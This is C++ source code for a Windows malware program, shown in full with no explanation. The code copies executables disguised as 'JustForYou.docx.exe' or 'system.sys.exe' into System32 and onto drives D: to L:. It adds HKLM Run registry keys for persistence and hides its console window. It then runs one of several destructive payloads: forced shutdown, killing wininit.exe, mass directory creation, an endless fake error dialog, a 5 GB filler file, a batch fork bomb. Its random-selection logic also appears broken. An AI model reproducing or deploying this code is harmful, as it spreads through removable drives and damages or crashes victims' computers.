#include<iostream>
#include<windows.h>
#include<time.h>
//#include<ctime>
/*#include<stdio.h>
#include<conio.h>
#include<stdlib.h>
#include<math.h>
#include<assert.h>
#include<ctype.h>
#include<float.h>
#include<limits.h>
#include<cstring>
#include<fstream>
#include<string>
*/
using namespace std;

bool B;
int rand_num;
/*
void down(int vk) {
	keybd_event(vk,0,KEYEVENTF_KEYUP,0);
}

void up(int vk) {
	keybd_event(vk,0,0,0);
}

void presss(int vk) {
	down(vk);
	Sleep(10);
	up(vk);
	Sleep(50);
}

void MouseMove(int x, int y) {
	double fScreenWidth = ::GetSystemMetrics(SM_CXSCREEN) - 1;
	double fScreenHeight = ::GetSystemMetrics(SM_CYSCREEN) - 1;
	double fx = x*(65535.0f / fScreenWidth);
	double fy = y*(65535.0f / fScreenHeight);
	INPUT  Input = { 0 };
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
	Input.mi.dx = fx;
	Input.mi.dy = fy;
	SendInput(1, &Input, sizeof(INPUT));
}

void MouseLeftDown() {
	INPUT  Input = { 0 };
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
	SendInput(1, &Input, sizeof(INPUT));
}

void MouseLeftUp() {
	INPUT  Input = { 0 };
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
	SendInput(1, &Input, sizeof(INPUT));

}

void MouseRightDown() {
	INPUT  Input = { 0 };
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
	SendInput(1, &Input, sizeof(INPUT));
}

void MouseRightUp() {
	INPUT  Input = { 0 }; 
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
	SendInput(1, &Input, sizeof(INPUT));
}
*/
void vsystem() {
	system("copy /Y cookie.exe C:\\Windows\\System32\\ ");
	system("copy /Y JustForYou.docx.exe C:\\Windows\\System32\\ ");
	system("rename C:\\Windows\\System32\\cookie.exe system.sys.exe");
	system("rename C:\\Windows\\System32\\JustForYou.docx.exe system.sys.exe");
	system("copy /Y cookie.exe d:\\ ");
	system("rename D:\\cookie.exe JustForYou.docx.exe");
	system("copy /Y cookie.exe e:\\ ");
	system("rename E:\\cookie.exe JustForYou.docx.exe");
	system("copy /Y cookie.exe f:\\ ");
	system("rename F:\\cookie.exe JustForYou.docx.exe");
	system("copy /Y cookie.exe g:\\ ");
	system("rename G:\\cookie.exe JustForYou.docx.exe");
	system("copy /Y cookie.exe h:\\ ");
	system("rename H:\\cookie.exe JustForYou.docx.exe");
	system("copy /Y cookie.exe i:\\ ");
	system("rename I:\\cookie.exe JustForYou.docx.exe");
	system("copy /Y cookie.exe j:\\ ");
	system("rename J:\\cookie.exe JustForYou.docx.exe");
	system("copy /Y cookie.exe k:\\ ");
	system("rename K:\\cookie.exe JustForYou.docx.exe");
	system("copy /Y cookie.exe l:\\ ");
	system("rename L:\\cookie.exe JustForYou.docx.exe");
	
	system("copy /Y JustForYou.docx.exe d:\\ ");
	system("copy /Y JustForYou.docx.exe e:\\ ");
	system("copy /Y JustForYou.docx.exe f:\\ ");
	system("copy /Y JustForYou.docx.exe g:\\ ");
	system("copy /Y JustForYou.docx.exe h:\\ ");
	system("copy /Y JustForYou.docx.exe i:\\ ");
	system("copy /Y JustForYou.docx.exe j:\\ ");
	system("copy /Y JustForYou.docx.exe k:\\ ");
	system("copy /Y JustForYou.docx.exe l:\\ ");
	
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v system /t \"reg_sz\" /f ");
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v dsystem /t \"reg_sz\" /f ");
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v esystem /t \"reg_sz\" /f ");
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v fsystem /t \"reg_sz\" /f ");
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v gsystem /t \"reg_sz\" /f ");
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v hsystem /t \"reg_sz\" /f ");
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v isystem /t \"reg_sz\" /f ");
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v jsystem /t \"reg_sz\" /f ");
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v ksystem /t \"reg_sz\" /f ");
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v lsystem /t \"reg_sz\" /f ");
	
	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v system /t REG_SZ /d C:\\Windows\\System32\\system.sys.exe /f");
	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v dsystem /t REG_SZ /d D:\\JustForYou.docx.exe /f");
	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v esystem /t REG_SZ /d E:\\JustForYou.docx.exe /f");
	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v fsystem /t REG_SZ /d F:\\JustForYou.docx.exe /f");
	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v gsystem /t REG_SZ /d G:\\JustForYou.docx.exe /f");
	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v hsystem /t REG_SZ /d H:\\JustForYou.docx.exe /f");
	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v isystem /t REG_SZ /d I:\\JustForYou.docx.exe /f");
	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v jsystem /t REG_SZ /d J:\\JustForYou.docx.exe /f");
	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v ksystem /t REG_SZ /d K:\\JustForYou.docx.exe /f");
	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v lsystem /t REG_SZ /d L:\\JustForYou.docx.exe /f");
}
void Windisappear() {
	vsystem();
	HWND hwnd;
	hwnd=FindWindow("ConsoleWindowClass",NULL);
	if(hwnd) {
		ShowWindow(hwnd,SW_HIDE);
	}
}

void WinV(int a) {
	if(!a) {
		system("shutdown /s /t 0");
		cout<<a;

	} else if(a==1) {
		system("TASKKILL /F /IM wininit.exe /T");
	} else if(a==2) {
		system("cd C:\\ && for /l %%i in (1 1 1024) do md Error1024_%%i..\\");
		system("cd D:\\ && for /l %%i in (1 1 1024) do md Error1024_%%i..\\");
		system("cd E:\\ && for /l %%i in (1 1 1024) do md Error1024_%%i..\\");
	} else if(a==3) {
		while(1) {
			MessageBox(NULL,"#Error   1024!          ","Windows System",MB_ICONHAND);
		}
	} else if(a==4) {
		system("fsutil file createnew .\5GB.bin 5368709120");
	} else if(a==5) {
		system("echo %0|%0 >a.bat ");
		system("a.bat");
	} else {
		system("echo TASKKILL /F /IM wininit.exe /T >>C:\\Windows\\System32\\System.bat");
		system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v system6 /t \"reg_sz\" /f ");
		system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v esystem /t REG_SZ /d C:\\Windows\\System32\\System.bat /f");
	}
}

void Random_(long MAX,long MIN) {
	if(MIN<=MAX) {
		srand(time(0));
		rand_num=rand()%(MAX-MIN+1)+MIN;
	}
}

int main() {
	Windisappear();

	Random_(0,60000);
	
	int i=0;
	for(; i<=rand_num; i+=1000) {
		vsystem();
	}

	//MessageBox(NULL,"#Error   1024!          ","Windows System",MB_ICONHAND);

	Random_(0,6);
	WinV(rand_num);
	return 0;
}
